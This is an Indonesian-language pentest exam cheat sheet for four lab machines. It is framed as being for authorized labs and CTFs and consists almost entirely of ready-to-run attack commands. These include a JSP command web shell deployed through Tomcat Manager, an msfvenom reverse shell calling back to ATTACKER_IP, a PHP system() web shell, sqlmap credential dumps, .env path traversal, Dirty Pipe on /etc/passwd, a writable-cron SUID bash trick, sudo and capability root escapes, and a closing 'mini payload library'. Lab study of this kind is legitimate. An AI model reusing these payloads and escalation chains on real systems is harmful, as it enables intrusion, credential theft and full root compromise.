# Cheatsheet Ujian Close Book — Semua Lab

> Untuk lab/CTF/sistem yang telah memberikan izin pengujian.  
> Rangkuman ini menyatukan Catalina, Gazette, Portrait, dan Statute.  
> Pola umum mengikuti alur referensi `w4h4z/Pentest-Cheat-Sheet`: recon → foothold → reverse shell → enumerasi → privilege escalation → proof.

---

## 0. Alur Universal

```text
Recon
→ temukan celah awal
→ dapat foothold sebagai user biasa
→ cek id/whoami/hostname
→ privilege escalation sesuai lab
→ root
→ cari flag
→ cat flag
```

Cari flag setelah root:

```bash
find / -type f -iname "*flag*" 2>/dev/null
cat /PATH/FLAG
```

Cari isi file yang mengandung `FLAG`:

```bash
grep -RIni --binary-files=without-match "FLAG" /root /home /opt /var/www 2>/dev/null
```

---

## 1. Recon Cepat

```bash
TARGET="192.168.56.X"
WEB="http://192.168.56.X:PORT"

nmap -Pn -sC -sV -p- "$TARGET"
nmap -Pn -sC -sV -p22,80,8080,8081 "$TARGET"

dirsearch -u "$WEB" -e php,jsp,html,txt,bak,env
```

Petunjuk lab:

```text
Tomcat Manager       → Catalina
/administrator       → Portrait
/news/detail?id=1    → Gazette
/download?file=      → Statute
```

---

## 2. Setelah Dapat Shell

```bash
id
whoami
hostname
pwd
uname -a
cat /etc/os-release
```

Stabilkan reverse shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
/bin/sh -i
```

Enumerasi cepat:

```bash
sudo -l
getcap -r / 2>/dev/null
cat /etc/crontab 2>/dev/null
ls -la /etc/cron.d 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
find / -writable -type f 2>/dev/null | grep -v proc
```

---

# 3. Catalina — Tomcat Manager → WAR → Cron → Root

## Data Hafalan

```text
TARGET       = 192.168.56.122
WEB          = http://192.168.56.122:8081
ATTACKER_IP  = 192.168.56.116
Credential   = tomcat:s3cret
User awal    = tomcat
Cron vuln    = /opt/backup/backup.sh
Root shell   = /tmp/rootbash -p
Flag terbukti = /root/FLAG.txt
```

## Opsi A — JSP Manual

```bash
WEB="http://192.168.56.122:8081"
mkdir -p ~/tomcat-lab/labcmd && cd ~/tomcat-lab/labcmd

cat > cmd.jsp <<'EOF2'
<%@ page import="java.io.*" %><% String c=request.getParameter("cmd"); if(c!=null){String[] x={"/bin/sh","-c",c}; Process p=Runtime.getRuntime().exec(x); InputStream i=p.getInputStream(),e=p.getErrorStream(); byte[] b=new byte[4096]; int n; out.println("<pre>"); while((n=i.read(b))!=-1)out.write(new String(b,0,n)); while((n=e.read(b))!=-1)out.write(new String(b,0,n)); out.println("</pre>"); } %>
EOF2

zip -r labcmd.war cmd.jsp
curl -u tomcat:s3cret --upload-file labcmd.war "$WEB/manager/text/deploy?path=/labcmd&update=true"

SHELL_URL="$WEB/labcmd/cmd.jsp"
curl -sG --data-urlencode "cmd=id;whoami;hostname" "$SHELL_URL"
```

Root dan cari flag:

```bash
curl -sG --data-urlencode "cmd=printf '\ncp /bin/bash /tmp/rootbash\nchmod 4755 /tmp/rootbash\n' >> /opt/backup/backup.sh" "$SHELL_URL"
sleep 70
curl -sG --data-urlencode "cmd=/tmp/rootbash -p -c 'find / -type f -iname \"*flag*\" 2>/dev/null'" "$SHELL_URL"
curl -sG --data-urlencode "cmd=/tmp/rootbash -p -c 'whoami; cat /root/FLAG.txt'" "$SHELL_URL"
```

Expected:

```text
root
FLAG{cr0n_wr173_2_5u1d_r007b45h}
```

## Opsi B — msfvenom Reverse Shell

Terminal 1:

```bash
WEB="http://192.168.56.122:8081"
ATTACKER_IP="192.168.56.116"
LPORT="4444"

mkdir -p ~/tomcat-lab/msfvenom && cd ~/tomcat-lab/msfvenom
msfvenom -p java/jsp_shell_reverse_tcp LHOST="$ATTACKER_IP" LPORT="$LPORT" -f war -o catalina-shell.war
curl -u tomcat:s3cret --upload-file catalina-shell.war "$WEB/manager/text/deploy?path=/catalina-shell&update=true"
nc -lvnp 4444
```

Terminal 2:

```bash
curl -s "$WEB/catalina-shell/" >/dev/null
```

Setelah shell masuk:

```bash
id; whoami; hostname
printf '\ncp /bin/bash /tmp/rootbash\nchmod 4755 /tmp/rootbash\n' >> /opt/backup/backup.sh
sleep 70
/tmp/rootbash -p
whoami
find / -type f -iname "*flag*" 2>/dev/null
cat /root/FLAG.txt
```

---

# 4. Gazette — SQLi → SSH Editor → Dirty Pipe → Root

## Data Hafalan

```text
TARGET      = 192.168.56.121
URL         = http://192.168.56.121:8000/news/detail?id=1
Credential  = editor:password123
User awal   = editor
Privesc     = Dirty Pipe
Target file = /etc/passwd
```

SQLi dan SSH:

```bash
URL="http://192.168.56.121:8000/news/detail?id=1"
sqlmap -u "$URL" -p id --batch -D gazette -T users --dump

ssh editor@192.168.56.121
# password123
```

Dirty Pipe:

```bash
cd /home/editor
# dirtypipe.c diambil dari writeup Gazette lengkap
gcc -O2 -Wall dirtypipe.c -o dirtypipe

grep -bo 'editor:x:1001:1001' /etc/passwd
# offset UID = angka hasil grep + 9
# contoh: 2183 + 9 = 2192

./dirtypipe /etc/passwd 2192 0000
grep '^editor:' /etc/passwd

su - editor
# password123

whoami
id
find / -type f -iname "*flag*" 2>/dev/null
cat /PATH/FLAG
```

Catatan:

```text
Jangan menghafal 2192 sebagai angka pasti.
Selalu hitung dari hasil grep target aktual.
```

---

# 5. Portrait — SQLi → Upload PHP → Python Capability → Root

## Data Hafalan

```text
TARGET      = 192.168.56.118
WEB         = http://192.168.56.118:8080
Login       = /administrator
Upload      = /profile
Credential  = admin:AdminPortr417126
Web shell   = /uploads/cakgup.php
User awal   = www-data
Privesc     = /usr/bin/python3.13 cap_setuid=ep
```

SQLi credential:

```bash
WEB="http://192.168.56.118:8080"
LOGIN_URL="$WEB/administrator"
POST_DATA='username=admin&password=test'

sqlmap -u "$LOGIN_URL" --data="$POST_DATA" -p username --batch -D portrait -T users --dump
```

Upload PHP shell:

```bash
echo "<?php system(\$_GET['cmd']); ?>" > cakgup.php
# upload lewat browser: /administrator → login admin → /profile → upload cakgup.php

SHELL_URL="$WEB/uploads/cakgup.php"
curl -sG --data-urlencode "cmd=id; whoami; hostname" "$SHELL_URL"
```

Root dan cari flag:

```bash
curl -sG \
  --data-urlencode "cmd=/usr/bin/python3.13 -c 'import os; os.setuid(0); os.system(\"whoami; id; find / -type f -iname \\\"*flag*\\\" 2>/dev/null\")'" \
  "$SHELL_URL"
```

Baca flag dari path hasil `find`:

```bash
curl -sG \
  --data-urlencode "cmd=/usr/bin/python3.13 -c 'import os; os.setuid(0); os.system(\"cat /PATH/FLAG\")'" \
  "$SHELL_URL"
```

Kalau path Python berbeda:

```bash
curl -sG --data-urlencode "cmd=getcap -r / 2>/dev/null | grep -i python" "$SHELL_URL"
```

---

# 6. Statute — Path Traversal → .env → SSH → sudo vim → Root

## Data Hafalan

```text
TARGET     = 192.168.56.120
WEB        = http://192.168.56.120:8080
Celah      = /download?file=../.env
User SSH   = operator
Privesc    = sudo vim
```

Ambil credential:

```bash
TARGET="192.168.56.120"
WEB="http://192.168.56.120:8080"

curl --path-as-is -s -H 'User-Agent: Mozilla/5.0' "$WEB/download?file=../.env"
```

SSH dan root:

```bash
ssh operator@"$TARGET"
# password dari DB_PASSWORD

whoami; id; hostname
sudo -l
sudo vim -c ':!/bin/sh'
```

Di shell root:

```bash
whoami
id
find / -type f -iname "*flag*" 2>/dev/null
cat /PATH/FLAG
```

Kalau cara cepat Vim kurang nyaman:

```bash
sudo vim
```

Di dalam Vim:

```vim
:!/bin/bash
```

---

# 7. Mini Payload Library

## SQLMap

```bash
sqlmap -u "http://TARGET/page?id=1" --batch --dbs
sqlmap -u "http://TARGET/page?id=1" --batch -D DB --tables
sqlmap -u "http://TARGET/page?id=1" --batch -D DB -T users --dump
sqlmap -u "$LOGIN_URL" --data='username=admin&password=test' -p username --batch --current-db
```

## PHP Web Shell

```php
<?php system($_GET['cmd']); ?>
```

Akses:

```bash
curl -sG --data-urlencode "cmd=id" "http://TARGET/uploads/shell.php"
```

## Tomcat WAR Reverse Shell

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f war -o shell.war
nc -lvnp 4444
```

## Writable Cron to SUID Bash

```bash
echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' >> /path/script.sh
sleep 70
/tmp/rootbash -p
id
```

## sudo GTFOBins Cepat

```bash
sudo -l
sudo vim -c ':!/bin/sh'
sudo find . -exec /bin/sh \; -quit
sudo env /bin/sh
sudo python3 -c 'import os; os.system("/bin/sh")'
```

## Capability Python

```bash
getcap -r / 2>/dev/null | grep -i python
/usr/bin/python3.13 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

## Cari Flag

```bash
find / -type f -iname "*flag*" 2>/dev/null
grep -RIni --binary-files=without-match "FLAG" /root /home /opt /var/www 2>/dev/null
cat /PATH/FLAG
```

---

# 8. Hafalan Super Pendek

```text
Catalina:
Tomcat Manager → deploy WAR → tomcat → append rootbash ke backup.sh → sleep 70 → rootbash -p → find flag

Gazette:
SQLmap dump → SSH editor → grep offset passwd → dirtypipe 0000 → su editor → find flag

Portrait:
SQLmap dump → login admin → upload PHP → python cap_setuid → find flag

Statute:
curl ../.env → SSH operator → sudo vim shell escape → find flag
```

---

## Referensi

- https://github.com/w4h4z/Pentest-Cheat-Sheet
- Write-up lab lokal pada folder `Write-Up Lab/`
